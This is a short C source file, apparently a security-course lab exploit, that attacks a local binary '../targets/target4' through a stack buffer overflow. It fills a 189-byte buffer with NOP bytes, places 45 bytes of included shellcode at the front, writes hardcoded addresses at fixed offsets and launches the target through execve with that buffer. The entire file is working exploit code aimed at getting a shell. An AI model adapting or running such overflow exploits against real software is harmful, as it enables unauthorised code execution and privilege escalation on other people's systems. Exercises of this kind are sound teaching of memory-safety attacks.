#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int main(void)
{
	char *args[3];
	char *env[1];

	int BUFSIZE = 189;
	char attackBuffer[BUFSIZE];
	int shellcode_length = 45;
	int i;
	for (i = 0; i < BUFSIZE; i++){
		attackBuffer[i] = 0x90;	
	}
	for (i = 0; i < 45; i ++){
		attackBuffer[ i] = shellcode[i];
	}
	*(int *) & attackBuffer[184] = 0x3050fdb0;
	*(int *) & attackBuffer[168] = 0x010101BC;
	*(int *) & attackBuffer[172] = 0x010101AC;
	attackBuffer[188] = NULL;
	
	args[0] = TARGET;
	args[1] = attackBuffer;
	args[2] = NULL;
	env[0] = NULL;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
